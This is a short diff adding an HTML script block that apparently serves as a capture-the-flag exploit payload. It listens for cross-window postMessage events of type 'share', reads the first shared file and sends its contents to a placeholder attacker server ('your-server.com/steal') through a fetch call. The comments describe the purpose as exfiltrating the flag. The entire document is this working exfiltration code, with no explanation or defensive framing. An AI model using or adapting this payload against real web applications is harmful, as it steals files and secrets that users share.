@@ -1,0 +1,14 @@
+<script>
+    // Listen for the flag from postMessage
+    window.addEventListener("message", (e) => {
+      if (e.data?.type === "share") {
+        const blob = e.data.files[0].blob;
+        const reader = new FileReader();
+        reader.onload = () => {
+          // Exfiltrate the flag to your server
+          fetch("https://your-server.com/steal?flag=" + encodeURIComponent(reader.result));
+        };
+        reader.readAsText(blob);
+      }
+    });
+  </script>
